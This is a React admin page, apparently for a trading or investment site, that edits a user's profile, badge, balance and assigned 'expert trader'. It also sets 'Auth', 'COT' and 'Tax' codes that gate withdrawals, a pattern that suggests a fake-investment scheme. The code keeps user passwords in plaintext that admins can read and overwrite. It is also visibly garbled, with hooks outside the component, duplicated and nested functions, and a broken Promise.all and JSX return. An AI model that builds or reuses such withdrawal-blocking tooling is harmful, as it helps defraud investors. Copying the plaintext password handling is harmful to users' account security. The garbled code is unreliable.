import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { supabase } from "@/lib/supabaseClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { StatusBadge, TierBadge } from "../components/StatusBadge";
import { BalanceModal } from "../components/BalanceModal";
import { toast } from "sonner";
import {
Trash2, Ban, CheckCircle2, AlertTriangle, ArrowLeft, Wallet, KeyRound, ShieldAlert,
Sparkles, UserCog, Briefcase,
} from "lucide-react";

const BADGES = ["Basic Account", "Veteran Account", "Ultimate Account", "Master Account", "Diamond Account"];

const [codes, setCodes] = useState<Record<string, string>>({
  auth: "", cot: "", tax: ""
});
const [codeToggles, setCodeToggles] = useState<Record<string, boolean>>({
  auth: true, cot: false, tax: false
});

const emptyCodes = (uid: string): Codes => ({
user_id: uid,
auth_code: null, cot_code: null, tax_code: null,
auth_required: true,
cot_required: false,
tax_required: false,
});

const genCode = () => Math.random().toString(36).slice(2, 10).toUpperCase();

export default function UserDetail() {
const { id } = useParams();
const navigate = useNavigate();
const [user, setUser] = useState<any>(null);
const [pwd, setPwd] = useState("");
const [pwd2, setPwd2] = useState("");
const [badge, setBadge] = useState<string>("");
const [codes, setCodes] = useState<Codes | null>(null);
const [traders, setTraders] = useState<any[]>([]);
const [assignedId, setAssignedId] = useState<string>("");
const [balanceOpen, setBalanceOpen] = useState(false);

const load = async () => {
if (!id) return;
const [{ data: u, error }, { data: c }, { data: tr }] = await Promise.all([
supabase.from("profiles").select("*").eq("user_id", id).single(),
const [codes, setCodes] = useState<Record<string, string>>({
  auth: "", cot: "", tax: ""
});
// ✅ Correct — fetch ALL rows for user
const { data: c } = await supabase
  .from("account_withdrawal_codes")
  .select("*")
  .eq("user_id", id);

// Then parse into state
const codeMap = { auth: "", cot: "", tax: "" };
const toggleMap = { auth: true, cot: false, tax: false };
if (c) {
  c.forEach((row: any) => {
    codeMap[row.code_type] = row.code;
    toggleMap[row.code_type] = true;
  });
}
setCodes(codeMap);
setCodeToggles(toggleMap);

supabase.from("expert_traders").select("id, full_name, specialty, performance_pct").order("created_at", { ascending: false }),
]);
if (error) return toast.error(error.message);
setUser(u);
setBadge(u.badge || "Basic Account");
setAssignedId(u.assigned_expert_id || "");
setCodes((c as Codes) ?? emptyCodes(id));
setTraders(tr ?? []);
};

useEffect(() => { document.title = "Admin · User Detail"; load(); }, [id]);

if (!user) return <p className="text-muted-foreground">Loading…</p>;

const updateProfile = async (patch: Record<string, any>, msg = "Saved") => {
const { error } = await supabase.from("profiles").update(patch as any).eq("user_id", id);
if (error) return toast.error(error.message);
toast.success(msg);
load();
};

const saveProfile = () => updateProfile({
full_name: user.full_name, username: user.username, email: user.email,
phone: user.phone, country: user.country, plaintext_password: user.plaintext_password,
}, "Profile updated");

const toggleSuspend = () => updateProfile({ status: user.status === "suspended" ? "active" : "suspended" }, "Status changed");
const toggleBlock = () => updateProfile({ status: user.status === "blocked" ? "active" : "blocked" }, "Status changed");

const del = async () => {
if (!confirm(`Delete ${user.email}? Permanent.`)) return;
const { error } = await supabase.functions.invoke("admin-delete-user", { body: { user_id: id } });
if (error) return toast.error(error.message);
toast.success("Deleted");
navigate("/admin/users");
};

const saveBadge = () => updateProfile({ account_level: badge }, "Badge updated");

const updatePwd = async () => {
if (pwd !== pwd2) return toast.error("Passwords do not match");
if (pwd.length < 6) return toast.error("Min 6 characters");
const { error } = await supabase
.from("profiles")
.update({ plaintext_password: pwd })
.eq("user_id", id);
if (error) return toast.error(error.message);
toast.success("Password updated");
setPwd(""); setPwd2("");
load();
};

const saveCodes = async () => {
if (!codes) return;
const saveCodes = async () => {
  // Delete all existing codes for this user first
  await supabase
    .from("account_withdrawal_codes")
    .delete()
    .eq("user_id", id);

  // Re-insert only toggled-on codes
  const rows = (["auth", "cot", "tax"] as const)
    .filter((k) => codeToggles[k] && codes[k].trim())
    .map((k) => ({
      user_id: id,
      code_type: k,
      code: codes[k].trim().toUpperCase(),
      verified: false,
    }));

  if (rows.length === 0) {
    toast.success("All codes cleared");
    return;
  }

  const { error } = await supabase
    .from("account_withdrawal_codes")
    .insert(rows);

  if (error) return toast.error(error.message);
  toast.success("Codes saved");
};


  if (rows.length === 0) {
    toast.success("All codes cleared");
    return;
  }

  const { error } = await supabase
    .from("account_withdrawal_codes")
    .insert(rows);

  if (error) return toast.error(error.message);
  toast.success("Codes saved");
};

if (error) return toast.error(error.message);
toast.success("Codes saved");
};

const assignTrader = async () => {
await updateProfile({ assigned_expert_id: assignedId || null }, "expert assigned");
};

return (
// ✅ Correct UI using new state
{(["auth", "cot", "tax"] as const).map((k) => {
  const label = k === "auth" ? "Auth Code" : k === "cot" ? "COT Code" : "Tax Code";
  return (
    <div key={k} className="space-y-2 rounded-md border border-border p-3">
      <div className="flex items-center justify-between">
        <Label className="text-sm">{label}</Label>
        <div className="flex items-center gap-2">
          <span className="text-[11px] text-muted-foreground">Required</span>
          <Switch
            checked={codeToggles[k]}
            // auth is always on, cant be toggled off
            disabled={k === "auth"}
            onCheckedChange={(v) =>
              setCodeToggles({ ...codeToggles, [k]: v })
            }
          />
        </div>
      </div>
      {codeToggles[k] && (
        <div className="flex gap-2">
          <Input
            className="font-mono"
            placeholder="Enter code"
            value={codes[k]}
            onChange={(e) =>
              setCodes({ ...codes, [k]: e.target.value })
            }
          />
          <Button
            type="button"
            variant="outline"
            size="sm"
            onClick={() => setCodes({ ...codes, [k]: genCode() })}
          >
            <Sparkles className="h-3.5 w-3.5" />
          </Button>
        </div>
      )}
    </div>
  );
})}
